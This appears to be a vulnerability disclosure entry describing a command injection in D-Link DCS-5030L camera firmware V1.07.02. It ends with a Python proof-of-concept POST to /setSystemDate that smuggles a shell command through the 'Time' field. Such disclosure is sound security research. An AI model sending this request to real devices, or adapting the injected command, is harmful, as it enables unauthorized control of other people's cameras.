# command injection

## D-LINK DCS-5030L

version: V1.07.02

## Description:

There is a command injection in alphapd/sub_435028

## Source:

you may download it from : [legacyfiles.us.dlink.com - /DCS-5030L/REVA/FIRMWARE/](http://legacyfiles.us.dlink.com/DCS-5030L/REVA/FIRMWARE/)

## Analyse:

![](5.png)

If some keywords are null and set ConfigReboot, get into line 37.

![](6.png)

then call doSystem ,causes command injection via parameter v10

## POC

```
url = "http://192.168.1.13/setSystemDate"
headers = {
    'Host': '192.168.1.13',
    'Authorization': 'Basic base64(admin:password)',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = {
    'ReplySuccessPage':'advanced.htm',
    'ReplyErrorPage':'errradv.htm',
    'Time':';ls > /tmp/1;',
    'ConfigReboot':'No'
}
r = requests.post(url, data=data,headers=headers)
```
